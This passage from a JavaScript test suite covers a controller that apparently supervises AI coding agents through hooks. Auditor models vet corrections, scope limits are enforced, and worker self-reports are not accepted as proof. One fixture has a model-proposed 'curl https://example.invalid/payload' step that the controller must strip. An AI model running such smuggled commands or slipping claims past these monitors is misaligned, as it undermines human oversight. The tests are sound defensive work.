      verifiedFacts: ["acceptance is red"],
    } }),
  });
  h.store.writeJson("endurance-preregistration.json", {
    recoveryDrill: { mustProduceAuditedCausalIntervention: true },
  });
  const stopped = h.controller.stop({ input: {
    hook_event_name: "Stop", transcript_path: h.transcript,
  } });
  assert.equal(stopped.output.decision, "block");
  assert.match(stopped.output.reason, /没有任何 artifact 修复权限/u);
  assert.doesNotMatch(stopped.output.reason, /AssertionError|继续修复/u,
    "the rejected acceptance output is not laundered into a worker repair instruction");
  const events = h.store.events();
  assert.equal(events.some((event) => event.type === "correction_emitted"), false);
  assert.equal(events.some((event) => event.type === "acceptance_rework_emitted"), false);
  assert.ok(events.some((event) => event.type === "audited_correction_hold_emitted"
    && event.supervisorStatus === "invalid-correction" && event.modelCallUsed === false));
});

test("a formal-correction-only Codex contract also holds after factual rejection", () => {
  const red = { ran: true, passed: false, exit: 1, command: "npm test",
    output: "Expected 2, received 1" };
  const h = harness({
    operatorAsk: "只有在 Outsider 明确阻止第一次 Stop，并向主 Agent 送达正式纠正后，才执行一次最小修复。",
    acceptanceResults: [red],
    supervisorHandler: () => ({ ok: true, verdict: {
      onTrack: false, drift: "value remains 1", plan: ["change value"],
      expectedNextActions: ["edit:src/value.js", "run:acceptance"], acceptanceRisk: "red",
    } }),
    correctionAuditorHandler: () => ({ ok: true, verdict: {
      passed: false, errors: ["candidate correction was not factually approved"],
      verifiedFacts: ["acceptance is red"],
    } }),
  });
  const stopped = h.controller.stop({ agent: "codex", input: {
    hook_event_name: "Stop", transcript_path: h.transcript,
  } });
  assert.equal(stopped.output.decision, "block");
  assert.match(stopped.output.reason, /没有任何 artifact 修复权限/u);
  assert.doesNotMatch(stopped.output.reason, /Expected 2|继续修复/u);
  assert.equal(h.store.events().some((event) => event.type === "correction_emitted"), false);
  assert.equal(h.store.events().some((event) => event.type === "acceptance_rework_emitted"), false);
  assert.ok(h.store.events().some((event) => event.type === "audited_correction_hold_emitted"));
});

test("independent semantic gaps carry authority while wrong narrative counts stay out of control", () => {
  const green = { ran: true, passed: true, exit: 0, command: "npm test", output: "public green" };
  const gap = "String(delta) can throw before the required finite error for Object.create(null)";
  const h = harness({
    acceptanceResults: [green],
    verifierHandler: () => ({ ok: true, verdict: {
      passed: false, gaps: [gap], evidence: ["current source calls String(delta)"],
    } }),
    supervisorHandler: () => ({ ok: true, verdict: {
      onTrack: false,
      drift: "wrong side count: five deltas and two balance assertions",
      plan: ["separate rejected-value formatting from the required finite TypeError"],
      expectedNextActions: [
        "edit:src/value.js（remove unsafe coercion）",
        "run:node -e '<model-authored probe>'（cover null-prototype and poisoned coercion; exit 0）",
        "run:acceptance（npm test, exit 0）",
      ],
      acceptanceRisk: "incorrect telemetry count: 5 instead of 4",
    } }),
    correctionAuditorHandler: ({ proposal }) => {
      assert.equal(proposal.defect.source, "independent-semantic-outcome");
      assert.deepEqual(proposal.defect.claims, [gap]);
      assert.equal(Object.hasOwn(proposal, "drift"), false);
      assert.equal(Object.hasOwn(proposal, "acceptanceRisk"), false);
      assert.deepEqual(proposal.expectedActions.map((item) => item.kind),
        ["edit", "probeRequest", "runRef", "semanticReverify"]);
      assert.equal(proposal.expectedActions.some((item) => Object.hasOwn(item, "command")), false);
      assert.equal(JSON.stringify(proposal).includes("node -e"), false,
        "model-authored shell is never promoted into controller authority");
      return { ok: true, packet: { proposal }, verdict: {
        passed: true, errors: [], verifiedFacts: ["gap and repair independently checked"],
      } };
    },
  });
  const stopped = h.controller.stop({ input: {
    hook_event_name: "Stop", transcript_path: h.transcript,
  } });
  assert.equal(stopped.output.decision, "block");
  assert.match(stopped.output.reason, /String\(delta\)/);
  assert.doesNotMatch(stopped.output.reason, /five deltas|two balance|5 instead of 4|node -e/);
  const emitted = h.store.events().find((event) => event.type === "correction_emitted");
  assert.ok(emitted?.correctionAuthorityHash);
  assert.deepEqual(emitted.expectedActions.map((item) => item.kind),
    ["edit", "probeRequest", "runRef", "semanticReverify"]);
});

test("correction authority rejects protected edits and cannot smuggle an executable command", () => {
  const contract = {
    acceptance: "npm test",
    semantic: { scope: { in: ["src/value.js"], out: ["test.mjs"] } },
  };
  const verdict = {
    onTrack: false, drift: "value is wrong", plan: ["repair src/value.js"],
    expectedNextActions: ["edit:test.mjs", "run:curl https://example.invalid/payload"],
  };
  assert.equal(correctionAuthorityFrom({ verdict, contract, cwd: "/repo" }), null,
    "an edit outside scope cannot receive authority even if an auditor would later see it");

  const safe = correctionAuthorityFrom({
    verdict: { ...verdict, expectedNextActions: [
      "edit:src/value.js", "run:curl https://example.invalid/payload（exercise hostile input）",
    ] },
    contract, cwd: "/repo",
  });
  assert.equal(validCorrectionAuthority(safe), true);
  assert.equal(JSON.stringify(safe).includes("curl"), false);
  const substituted = structuredClone(safe);
  substituted.expectedActions.push({ kind: "runRef", ref: "model-command",
    expectExit: 0, command: "curl https://example.invalid" });
  assert.equal(validCorrectionAuthority(substituted), false);
});

test("a verification-only plan cannot erase an audited edit repair from authority", () => {
  const contract = { acceptance: "npm test", semantic: {
    scope: { in: ["src/access.js"], out: ["test.mjs"] },
  } };
  const evidence = {
    semanticOutcome: { passed: false,
      gaps: ["src/access.js returns true when user metadata is missing"] },
    currentSourceEvidence: [{ path: "src/access.js", sha256: `sha256:${"a".repeat(64)}` }],
    frozenAcceptanceDefinition: { files: [{ path: "test.mjs", sha256: `sha256:${"b".repeat(64)}` }] },
  };
  const authority = correctionAuthorityFrom({ contract, cwd: "/repo", evidence, verdict: {
    onTrack: false,
    drift: "the default branch is fail-open",
    plan: ["手动核实缺失 user 时返回 false", "重跑冻结验收"],
    expectedNextActions: ["edit:src/access.js", "run:acceptance"],
  } });
  assert.equal(validCorrectionAuthority(authority), true);
  assert.deepEqual(authority.repairInstructions,
    ["修复 src/access.js，使其消除上述已审计缺陷主张；不得修改受保护文件"]);
  assert.equal(authority.expectedActions[0].kind, "edit");
});

test("read and protection prose cannot suppress the positive repair bound to a typed edit", () => {
  const contract = { acceptance: "npm test", semantic: {
    scope: { in: ["src/index.js"], out: ["test.mjs", "package.json"] },
  } };
  const evidence = {
    currentSourceEvidence: [{ path: "src/index.js", sha256: `sha256:${"a".repeat(64)}` }],
    frozenAcceptanceDefinition: { files: [
      { path: "test.mjs", sha256: `sha256:${"b".repeat(64)}` },
      { path: "package.json", sha256: `sha256:${"c".repeat(64)}` },
    ] },
  };
  const authority = correctionAuthorityFrom({ contract, cwd: "/repo", evidence, verdict: {
    onTrack: false,
    drift: "src/index.js changed integratedValue from addition to subtraction",
    plan: [
      "读取 src/index.js，确认当前使用的是减号",
      "若验收仍不通过，只按真实报错继续修且不得修改测试",
    ],
    expectedNextActions: ["read:src/index.js", "edit:src/index.js", "run:acceptance"],
  } });
  assert.equal(validCorrectionAuthority(authority), true);
  assert.deepEqual(authority.repairInstructions, [
    "修复 src/index.js，使其消除上述已审计缺陷主张；不得修改受保护文件",
  ]);
  assert.deepEqual(authority.expectedActions.map((item) => item.kind),
    ["read", "edit", "runRef", "semanticReverify"]);
});

test("only an explicit typed delete can authorize an audited file deletion", () => {
  const cwd = "/tmp/outsider recovery workspace";
  const contract = { acceptance: "npm test", semantic: { scope: { in: [], out: [] } } };
  const evidence = {
    currentSourceEvidence: [{ path: ".outsider-endurance-drift",
      sha256: `sha256:${"d".repeat(64)}`, content: "synthetic drift\n" }],
    frozenAcceptanceDefinition: { files: [] },
  };
  const authority = correctionAuthorityFrom({ contract, cwd, evidence, verdict: {
    onTrack: false,
    drift: "the evaluator-owned drift marker makes sealed acceptance red",
    plan: [`remove only ${cwd}/.outsider-endurance-drift itself`],
    expectedNextActions: [
      `delete:${cwd}/.outsider-endurance-drift`,
      "run:acceptance",
    ],
  } });
  assert.equal(validCorrectionAuthority(authority), true);
  assert.deepEqual(authority.expectedActions[0], {
    kind: "delete", path: ".outsider-endurance-drift", preSha256: `sha256:${"d".repeat(64)}`,
  });
  assert.match(authority.repairInstructions.at(-1), /删除 \.outsider-endurance-drift 本身/u);

  const quoted = correctionAuthorityFrom({ contract, cwd, evidence, verdict: {
    onTrack: false, drift: "same defect", plan: ["remove the marker"],
    expectedNextActions: [`delete:\"${cwd}/.outsider-endurance-drift\"`, "run:acceptance"],
  } });
  assert.equal(validCorrectionAuthority(quoted), true);
  assert.equal(quoted.expectedActions[0].kind, "delete");
  assert.equal(quoted.expectedActions[0].path, ".outsider-endurance-drift");

  const readThenDelete = correctionAuthorityFrom({ contract, cwd, evidence, verdict: {
    onTrack: false, drift: "same defect",
    plan: ["读取并确认 .outsider-endurance-drift 后删除该文件本身"],
    expectedNextActions: ["read:.outsider-endurance-drift", "run:acceptance"],
  } });
  assert.equal(validCorrectionAuthority(readThenDelete), true);
  assert.deepEqual(readThenDelete.expectedActions[0], {
    kind: "read", path: ".outsider-endurance-drift",
  }, "narrative deletion prose cannot escalate a typed read into delete authority");

  const priorBadDelete = correctionAuthorityFrom({ contract, cwd, evidence, verdict: {
    onTrack: false,
    drift: "the prior draft wrongly proposed deleting .outsider-endurance-drift",
    plan: ["do not delete it; edit the existing marker instead"],
    expectedNextActions: ["edit:.outsider-endurance-drift", "run:acceptance"],
  } });
  assert.equal(priorBadDelete.expectedActions[0].kind, "edit");
  assert.equal(priorBadDelete.expectedActions[0].path, ".outsider-endurance-drift");
});

test("a controller-hashed post-baseline addition can be deleted without widening edit scope", () => {
  const cwd = "/tmp/outsider recovery workspace";
  const addedHash = `sha256:${"e".repeat(64)}`;
  const contract = { acceptance: "npm test", semantic: {
    scope: { in: ["src/index.js"], out: ["test.mjs"] },
  } };
  const evidence = {
    currentSourceEvidence: [{ path: "src/index.js", sha256: `sha256:${"a".repeat(64)}` }],
    diff: { changes: [{ path: ".outsider-endurance-drift", status: "added",
      beforeSha: null, afterSha: addedHash }] },
    frozenAcceptanceDefinition: { files: [
      { path: "test.mjs", sha256: `sha256:${"b".repeat(64)}` },
    ] },
  };
  const authority = correctionAuthorityFrom({ contract, cwd, evidence, verdict: {
    onTrack: false,
    drift: "the controller-observed added marker makes frozen acceptance red",
    plan: ["remove only the newly added .outsider-endurance-drift file"],
    expectedNextActions: ["delete:.outsider-endurance-drift", "run:acceptance"],
  } });
  assert.equal(validCorrectionAuthority(authority), true);
  assert.deepEqual(authority.expectedActions[0], {
    kind: "delete", path: ".outsider-endurance-drift", preSha256: addedHash,
  });
  const unsafeEdit = correctionAuthorityFrom({ contract, cwd, evidence, verdict: {
    onTrack: false, drift: "unrelated", plan: ["change unrelated.js"],
    expectedNextActions: ["edit:unrelated.js", "run:acceptance"],
  } });
  assert.equal(unsafeEdit, null);
});

test("a late recovery authority does not rebuild completed team tasks or reassign their reads", () => {
  const cwd = "/tmp/outsider completed team";
  const markerHash = `sha256:${"d".repeat(64)}`;
  const contract = { acceptance: "npm test", semantic: {
    scope: { in: ["src/store.js", "src/scheduler.js", "src/recovery.js", "src/index.js"],
      out: ["test.mjs"] },
  } };
  const evidence = {
    coordination: { tasks: [
      { id: "1", kind: "team", owner: "store-owner", status: "completed",
        independentlyVerified: true, description: "owns src/store.js", blockedBy: [],
        touchedFiles: ["src/store.js"] },
      { id: "2", kind: "team", owner: "scheduler-owner", status: "completed",
        independentlyVerified: true, description: "owns src/scheduler.js", blockedBy: [],
        touchedFiles: ["src/scheduler.js"] },
      { id: "3", kind: "team", owner: "lead", status: "completed",
        independentlyVerified: true, description: "owns src/recovery.js and src/index.js",
        blockedBy: ["1", "2"], touchedFiles: ["src/recovery.js", "src/index.js"] },
    ] },
    diff: { changes: [{ path: ".outsider-endurance-drift", status: "added",
      beforeSha: null, afterSha: markerHash }] },
    currentSourceEvidence: [],
    frozenAcceptanceDefinition: { files: [{ path: "test.mjs",
      sha256: `sha256:${"a".repeat(64)}` }] },
  };
  const authority = correctionAuthorityFrom({ contract, cwd, evidence, actorId: "main",
    agentTeamPolicy: {
      requiredTeammates: ["store-owner", "scheduler-owner"],
      requiredAgentModel: "sonnet",
      expectedFilesByTeammate: {
        "store-owner": "src/store.js", "scheduler-owner": "src/scheduler.js",
      },
      expectedFilesByLead: ["src/recovery.js", "src/index.js"],
    },
    verdict: {
      onTrack: false,
      drift: "the evaluator-owned marker keeps frozen acceptance red",
      plan: ["verify the delivered slices, remove only the marker, rerun acceptance"],
      expectedNextActions: [
        "read:src/store.js", "read:src/scheduler.js", "read:src/recovery.js",
        "read:src/index.js", "delete:.outsider-endurance-drift", "run:acceptance",
      ],
    } });
  assert.equal(validCorrectionAuthority(authority), true);
  assert.equal(authority.expectedActions.some((action) =>
    ["ensureTask", "spawnTeammate"].includes(action.kind)), false,
  "completed topology is evidence, not standing authority to recreate the team");
  assert.deepEqual(authority.expectedActions.filter((action) => action.kind === "read")
    .map((action) => action.actor), ["main", "main", "main", "main"],
  "lead performs verification reads after teammate tasks are frozen complete");
  assert.deepEqual(authority.repairInstructions,
    ["删除 .outsider-endurance-drift 本身（不是修改其内容），并保持受保护文件逐字节不变"]);
});

test("a hash-bound deletion is an effect only when explicitly authorized and actually absent", () => {
  const h = harness({ verdict: {
    onTrack: false,
    drift: "src/value.js must not exist at delivery",
    plan: ["删除 src/value.js 文件本身", "重跑冻结验收"],
    expectedNextActions: ["delete:src/value.js", "run:acceptance"],
    acceptanceRisk: "red while the file exists",
  } });
  h.controller.stop({ input: { hook_event_name: "Stop", transcript_path: h.transcript } });
  const correction = h.store.events().find((event) => event.type === "correction_emitted");
  assert.deepEqual(correction.expectedActions.map((item) => item.kind),
    ["delete", "runRef", "semanticReverify"]);
  appendFileSync(h.transcript,
    `${JSON.stringify({ type: "user", message: { content: correction.marker } })}\n`);

  h.controller.preTool({ input: { hook_event_name: "PreToolUse", tool_name: "Read",
    tool_input: { file_path: "src/value.js" }, transcript_path: h.transcript } });
  assert.equal(h.store.events().some((event) => event.type === "effect_observed"), false,
    "merely observing the correction does not credit a deletion");

  unlinkSync(path.join(h.cwd, "src", "value.js"));
  h.controller.preTool({ input: { hook_event_name: "PreToolUse", tool_name: "Bash",
    tool_input: { command: "npm test" }, transcript_path: h.transcript } });
  const effect = h.store.events().find((event) => event.type === "effect_observed");
  assert.deepEqual(effect.changedFiles, ["src/value.js"]);
  assert.match(effect.matchedExpectedAction, /"kind":"delete"/u);
});

test("a rejected correction is freshly re-diagnosed and only the repaired proposal reaches the worker", () => {
  const red = { ran: true, passed: false, exit: 1,
    command: "npm test && node sealed.mjs", output: "public examples passed\nsealed assertion failed" };
  let supervisorCalls = 0;
  let auditCalls = 0;
  const h = harness({
    acceptanceResults: [red],
    supervisorHandler: ({ packet }) => {
      supervisorCalls += 1;
      if (supervisorCalls === 1) return { ok: true, verdict: {
        onTrack: false,
        drift: "npm test failed because the implementation checks only the current tail window",
        plan: ["replace the tail-only decision", "rerun the sealed acceptance"],
        expectedNextActions: ["edit:src/value.js", "run:acceptance"],
        acceptanceRisk: "red",
      } };
      assert.match(packet.trigger, /^correction-rejected:/);
      assert.match(packet.rejectedCorrection.auditErrors.join(" "), /npm test itself passed/);
      assert.ok(packet.semanticContract?.successCriteria?.length,
        "fresh re-diagnosis receives the exact compiled standard cited by the outcome");
      return { ok: true, verdict: {
        onTrack: false,
        drift: "the public examples passed; the sealed assertion failed because the decision checks only the current tail window",
        plan: ["enforce the frozen global invariant for every accepted timestamp", "rerun sealed acceptance"],
        expectedNextActions: ["edit:src/value.js", "run:acceptance"],
        acceptanceRisk: "sealed acceptance is red",
      } };
    },
    correctionAuditorHandler: ({ proposal, evidence }) => {
      auditCalls += 1;
      if (auditCalls === 1) return { ok: true, packet: { proposal }, verdict: {
        passed: false,
        errors: ["npm test itself passed; the command after && failed"],
        verifiedFacts: ["public examples passed"],
      } };
      assert.match(evidence.trigger, /^correction-rejected:/);
      assert.match(evidence.rejectedCorrection.auditErrors.join(" "), /npm test itself passed/);
      assert.match(evidence.rejectedCorrection.priorProposal.defect.claims.join(" "), /npm test failed/,
        "the second auditor sees the exact proposal and audit that caused re-diagnosis");
      assert.doesNotMatch(proposal.defect.claims.join(" "), /npm test failed/);
      return { ok: true, packet: { proposal }, verdict: {
        passed: true,
        errors: [],
        verifiedFacts: ["the rewritten proposal attributes the red exit to the sealed assertion"],
      } };
    },
  });
  const stopped = h.controller.stop({ input: {
    hook_event_name: "Stop", transcript_path: h.transcript,
  } });
  assert.equal(stopped.output.decision, "block");
  assert.match(stopped.output.reason, /public examples passed/);
  const events = h.store.events();
  assert.equal(events.filter((event) => event.type === "correction_factual_audit").length, 2);
  assert.ok(events.some((event) => event.type === "supervisor_verdict"
    && event.source === "correction-rediagnosis"));
  assert.ok(events.some((event) => event.type === "correction_emitted"));
  assert.equal(supervisorReliability(events).correctionRediagnoses, 1);
});

test("a schema-valid but onTrack correction re-diagnosis receives one bounded semantic retry", () => {
  const red = { ran: true, passed: false, exit: 1,
    command: "npm test", output: "recovery marker still present" };
  let supervisorCalls = 0;
  let auditCalls = 0;
  const h = harness({
    acceptanceResults: [red],
    supervisorHandler: ({ packet }) => {
      supervisorCalls += 1;
      if (supervisorCalls === 1) return { ok: true, verdict: {
        onTrack: false, drift: "src/value.js leaves the recovery marker active",
        plan: ["defer the repair incorrectly"],
        expectedNextActions: ["read:src/value.js"], acceptanceRisk: "red",
      } };
      if (supervisorCalls === 2) {
        assert.match(packet.trigger, /^correction-rejected:/);
        return { ok: true, verdict: {
          onTrack: true, drift: "", plan: [], expectedNextActions: [], acceptanceRisk: "none",
        } };
      }
      assert.match(packet.trigger, /^correction-rediagnosis-invalid:/);
      assert.match(packet.validationFeedback.errors.join(" "), /remains red/);
      return { ok: true, verdict: {
        onTrack: false, drift: "src/value.js must remove the active recovery failure",
        plan: ["repair src/value.js", "rerun frozen acceptance"],
        expectedNextActions: ["edit:src/value.js", "run:acceptance"],
        acceptanceRisk: "red until repaired",
      } };
    },
    correctionAuditorHandler: () => {
      auditCalls += 1;
      return auditCalls === 1
        ? { ok: true, packet: { auditCalls }, verdict: {
          passed: false, errors: ["the read-only proposal cannot clear the red witness"],
          verifiedFacts: ["acceptance is red"],
        } }
        : { ok: true, packet: { auditCalls }, verdict: {
          passed: true, errors: [], verifiedFacts: ["the edit addresses the red witness"],
        } };
    },
  });
  const stopped = h.controller.stop({ input: {
    hook_event_name: "Stop", transcript_path: h.transcript,
  } });
  assert.equal(stopped.output.decision, "block");
  assert.match(stopped.output.reason, /OUTSIDER_INTERVENTION:/);
  const events = h.store.events();
  assert.ok(events.some((event) => event.type === "supervisor_retrying"
    && event.reason === "correction-rediagnosis-semantic-invalid"));
  assert.equal(events.filter((event) => event.type === "correction_emitted").length, 1);
  assert.equal(events.find((event) => event.type === "correction_emitted").attempt, 1);
  assert.equal(supervisorCalls, 3);
  assert.equal(auditCalls, 2);
});

test("a model auditor cannot authorize a read-only correction while frozen acceptance is red", () => {
  const red = { ran: true, passed: false, exit: 1,
    command: "npm test", output: "recovery marker still present" };
  let supervisorCalls = 0;
  const h = harness({
    acceptanceResults: [red],
    supervisorHandler: () => {
      supervisorCalls += 1;
      return supervisorCalls === 1 ? { ok: true, verdict: {
        onTrack: false, drift: "the marker is still present",
        plan: ["inspect the marker and rerun acceptance"],
        expectedNextActions: ["read:src/value.js", "run:acceptance"],
        acceptanceRisk: "red",
      } } : { ok: true, verdict: {
        onTrack: false, drift: "src/value.js keeps the marker active",
        plan: ["repair src/value.js", "rerun frozen acceptance"],
        expectedNextActions: ["edit:src/value.js", "run:acceptance"],
        acceptanceRisk: "red until repaired",
      } };
    },
    correctionAuditorHandler: () => ({ ok: true, packet: {}, verdict: {
      decision: "pass", passed: true, errors: [], blockingErrors: [], notes: [],
      verifiedFacts: ["the current proposal is grounded"], insufficient: null,
    } }),
  });
  h.store.writeJson("endurance-preregistration.json", { shiftPolicy: { checks: [
    "read:src/value.js", "run:npm test",
  ] } });
  const dispatch = h.store.append("endurance_shift_dispatched", {
    kind: "checkpoint", ordinal: 1, afterApprovedStopSeq: 1,
  });
  h.store.append("endurance_shift_input_submitted", {
    kind: "checkpoint", ordinal: 1, dispatchedAtSeq: dispatch.seq,
  });
  h.store.append("boundary_reached", { boundary: "PostToolUse", tool: "Read",
    toolUseId: "shift-read", file: path.join(h.cwd, "src/value.js"),
    action: `Read(${path.join(h.cwd, "src/value.js")})`, exit: 0, agentId: "main" });
  h.store.append("boundary_reached", { boundary: "PostToolUse", tool: "Bash",
    toolUseId: "shift-test", action: "npm test", exit: 0, agentId: "main" });
  const stopped = h.controller.stop({ input: {
    hook_event_name: "Stop", transcript_path: h.transcript,
  } });
  assert.equal(stopped.output.decision, "block");
  const events = h.store.events();
  const deterministic = events.find((event) =>
    event.type === "correction_audit_deterministically_rejected");
  assert.equal(deterministic.reason, "red-acceptance-without-artifact-mutation");
  assert.equal(deterministic.auditorPassed, true);
  assert.ok(events.some((event) => event.type === "supervisor_verdict"
    && event.source === "correction-rediagnosis"));
  const emitted = events.find((event) => event.type === "correction_emitted");
  assert.deepEqual(emitted.expectedActions.map((action) => action.kind),
    ["edit", "runRef", "semanticReverify"]);
});

test("a PASS that contradicts the frozen contract is rejected by a fresh approval audit", () => {
  const green = { ran: true, passed: true, exit: 0, command: "npm test", output: "green" };
  const h = harness({
    acceptanceResults: [green],
    verifierHandler: () => ({ ok: true, packet: { semanticContract: {
      successCriteria: ["arbitrary call sequences"],
    } }, verdict: {
      passed: true, gaps: [], evidence: ["non-monotonic behavior is excluded"],
    } }),
    outcomeAuditorHandler: (options) => {
      assert.equal(options.proposedVerdict.passed, true);
      return { ok: true, packet: { proposed: options.proposedVerdict }, verdict: {
        passed: false,
        errors: ["the PASS excludes non-monotonic calls while the frozen criterion requires arbitrary sequences"],
        verifiedFacts: [],
      } };
    },
  });
  const stopped = h.controller.stop({ input: {
    hook_event_name: "Stop", transcript_path: h.transcript,
  } });
  assert.equal(stopped.output.decision, "block");
  const events = h.store.events();
  assert.ok(events.some((event) => event.type === "outcome_verifier_proposal"
    && event.proposedPassed === true));
  assert.ok(events.some((event) => event.type === "outcome_approval_audit"
    && event.passed === false));
  assert.ok(events.some((event) => event.type === "outcome_verdict"
    && event.passed === false && event.verifierProposedPassed === true
    && event.approvalAuditPassed === false));
});

test("PASS approval binds the exact formal correction and transcript final report", () => {
  const red = { ran: true, passed: false, exit: 1,
    command: "npm test", output: "expected 2, received 1" };
  const green = { ran: true, passed: true, exit: 0,
    command: "npm test", output: "ok" };
  const report = [
    "- first Stop: blocked by Outsider",
    "- formal correction: change only src/value.js and run npm test",
    "- changed file: src/value.js",
    "- npm test: passed",
  ].join("\n");
  let captured = null;
  let auditPrompt = "";
  const h = harness({
    acceptanceResults: [red, green],
    outcomeAuditorHandler: (options) => auditOutcomeApproval({
      ...options,
      execute: ({ input }) => {
        auditPrompt = input;
        return { ok: true, value: {
          decision: "pass", blockingErrors: [], notes: [],
          verifiedFacts: ["controller evidence and report shape were independently checked"],
          insufficientReason: null,
        } };
      },
    }),
  });

  const first = h.controller.stop({ input: {
    hook_event_name: "Stop", transcript_path: h.transcript,
    last_assistant_message: "first completion attempt",
  }, agent: "codex" });
  assert.equal(first.output.decision, "block");
  const emitted = h.store.events().find((event) => event.type === "correction_emitted");
  assert.ok(emitted?.interventionId);
  applyObservedCorrection(h);
  appendFileSync(h.transcript, `${JSON.stringify({
    timestamp: "2026-08-23T17:02:20.769Z",
    type: "response_item",
    payload: { type: "message", role: "assistant", phase: "final_answer",
      content: [{ type: "output_text", text: report }] },
  })}\n`);

  const approved = h.controller.stop({ input: {
    hook_event_name: "Stop", transcript_path: h.transcript,
    last_assistant_message: report,
  }, agent: "codex" });
  assert.equal(approved.output.decision, "approve");
  const auditEvent = h.store.events().find((event) => event.type === "outcome_approval_audit");
  captured = h.store.readJson(auditEvent.evidenceFile)?.approvalEvidence;
  assert.equal(captured.formalCorrection.valid, true);
  assert.equal(captured.formalCorrection.correctionHash, emitted.correctionHash);
  assert.equal(captured.formalCorrection.correctionAuthorityHash,
    emitted.correctionAuthorityHash);
  assert.match(captured.formalCorrection.exactCorrectionText,
    new RegExp(emitted.interventionId));
  assert.equal(captured.formalCorrection.emittedEvent.seq, emitted.seq);
  assert.equal(captured.formalCorrection.observedEvent.seq > emitted.seq, true);
  assert.equal(captured.workerFinalReport.text, report);
  assert.equal(captured.workerFinalReport.transcriptBound, true);
  assert.equal(captured.workerFinalReport.transcript.latestAssistantPhase, "final_answer");
  assert.equal(captured.workerFinalReport.workerAssertionsAcceptedAsOutcomeEvidence, false);
  assert.match(auditPrompt, /worker 自述都不能证明结果/);
});

test("outcome verifier receives the transcript report without trusting its outcome claims", () => {
  const report = "changed src/value.js; npm test passed";
  let verifierCalls = 0;
  let verifierPrompt = "";
  const seen = [];
  const h = harness({
    verifierHandler: (options) => {
      verifierCalls += 1;
      seen.push(options);
      if (verifierCalls === 1) return {
        ok: false,
        error: "INVALID_OUTCOME_VERDICT",
        failure: { retryable: true, retryInstruction: "return the exact verdict JSON" },
      };
      return verifyOutcome({
        ...options,
        execute: ({ input }) => {
          verifierPrompt = input;
          return { ok: true, value: {
            passed: false,
            gaps: ["worker report cannot replace the red controller acceptance"],
            evidence: ["acceptance exit is 1 and controller diff has no changes"],
          } };
        },
      });
    },
  });
  const transcript = path.join(h.store.directory, "verifier-transcript.jsonl");
  writeFileSync(transcript, `${JSON.stringify({
    timestamp: "2026-08-23T17:34:23.135Z",
    type: "response_item",
    payload: { type: "message", role: "assistant", phase: "final_answer",
      content: [{ type: "output_text", text: report }] },
  })}\n`);
  const result = h.controller.verifySemanticOutcome({
    acceptanceResult: { ran: true, passed: false, exit: 1,
      command: "npm test", output: "expected 2, received 1" },
    phase: "stop",
    input: { transcript_path: transcript, last_assistant_message: report },
    agent: "codex",
  });

  assert.equal(result.status, "rejected");
  assert.equal(verifierCalls, 2);
  assert.equal(seen[0].terminationEvidence.workerFinalReport.text, report);
  assert.equal(seen[0].terminationEvidence.workerFinalReport.transcriptBound, true);
  assert.deepEqual(seen[1].terminationEvidence, seen[0].terminationEvidence,
    "schema retry must receive the same frozen transcript evidence");
  assert.equal(seen[1].acceptance.passed, false);
  assert.deepEqual(seen[1].diff.changes, []);
  const proposal = h.store.events().find((event) => event.type === "outcome_verifier_proposal");
  const packet = h.store.readJson(proposal.evidenceFile);
  assert.equal(packet.terminationEvidence.workerFinalReport.text, report);
  assert.equal(packet.acceptance.passed, false);
  assert.deepEqual(packet.diff.changes, []);
  assert.match(verifierPrompt, /worker 自述绝不能证明实现、测试或 outcome/);
});

test("a false onTrack clearance over red acceptance is deterministically rejected and re-diagnosed", () => {
  const red = { ran: true, passed: false, exit: 1, command: "npm test",
    output: "accepting 50 would leave three accepted timestamps inside (-900,100]" };
  let supervisorCalls = 0;
  const h = harness({
    acceptanceResults: [red],
    supervisorHandler: ({ packet }) => {
      supervisorCalls += 1;
      if (supervisorCalls === 1) return { ok: true, verdict: {
        onTrack: true,
        drift: "",
        plan: ["replace the approximate window", "rerun acceptance"],
        expectedNextActions: ["edit:src/value.js", "run:acceptance"],
        acceptanceRisk: "red",
      } };
      assert.match(packet.trigger, /^clearance-rejected:/);
      assert.match(packet.rejectedClearance.auditErrors.join(" "), /onTrack=true|acceptance is red/);
      return { ok: true, verdict: {
        onTrack: false,
        drift: "the implementation only checks the window ending at the proposed timestamp",
        plan: ["check every affected exact window before accepting", "rerun sealed acceptance"],
        expectedNextActions: ["edit:src/value.js", "run:acceptance"],
        acceptanceRisk: "sealed acceptance is currently red",
      } };
    },
    clearanceAuditorHandler: ({ evidence, proposal }) => {
      assert.equal(evidence.acceptance.passed, false);
      assert.equal(proposal.onTrack, true);
      return { ok: true, packet: { evidence, proposal }, verdict: {
        passed: false,
        errors: ["acceptance is red while the clearance claims no intervention is needed"],
        verifiedFacts: ["sealed acceptance exited 1"],
      } };
    },
    correctionAuditorHandler: ({ evidence, proposal }) => {
      assert.match(evidence.trigger, /^clearance-rejected:/);
      assert.match(evidence.rejectedClearance.auditErrors.join(" "),
        /acceptance is red|red acceptance/);
      assert.equal(proposal.defect.source, "fresh-supervisor-diagnosis");
      return { ok: true, packet: { evidence, proposal }, verdict: {
        passed: true, errors: [], verifiedFacts: ["the repaired diagnosis follows the red evidence"],
      } };
    },
  });
  const stopped = h.controller.stop({ input: {
    hook_event_name: "Stop", transcript_path: h.transcript,
  } });
  assert.equal(stopped.output.decision, "block");
  assert.match(stopped.output.reason, /OUTSIDER_INTERVENTION:/);
  const events = h.store.events();
  assert.ok(events.some((event) => event.type === "supervisor_clearance_audit"
    && event.passed === false && event.internallyConsistent === false
    && event.auditorPassed === null
    && event.auditSource === "deterministic-controller-contradiction"));
  assert.equal(events.filter((event) =>
    event.type === "supervisor_clearance_auditor_requested").length, 0);
  assert.ok(events.some((event) => event.type === "supervisor_clearance_rejected"
    && event.messageDelivered === false));
  assert.ok(events.some((event) => event.type === "supervisor_verdict"
    && event.source === "clearance-rediagnosis" && event.onTrack === false));
  assert.ok(events.some((event) => event.type === "correction_factual_audit" && event.passed));
  assert.ok(events.some((event) => event.type === "correction_emitted"));
  const reliability = supervisorReliability(events);
  assert.equal(reliability.clearanceErrorRate, 1);
  assert.equal(reliability.clearanceRediagnoses, 1);
});

test("a TaskCompleted red acceptance uses clearance re-diagnosis instead of returning an unattributed denial", () => {
  const red = { ran: true, passed: false, exit: 1, command: "npm test",
    output: "integration fixture still exports value 1 instead of the frozen value 2" };
  let supervisorCalls = 0;
  const h = harness({
    supervisorHandler: ({ packet }) => {
      supervisorCalls += 1;
      if (supervisorCalls === 1) return { ok: true, verdict: {
        onTrack: true, drift: "", plan: [], expectedNextActions: [], acceptanceRisk: "none",
      } };
      assert.match(packet.trigger, /^clearance-rejected:multi-agent-integration:/);
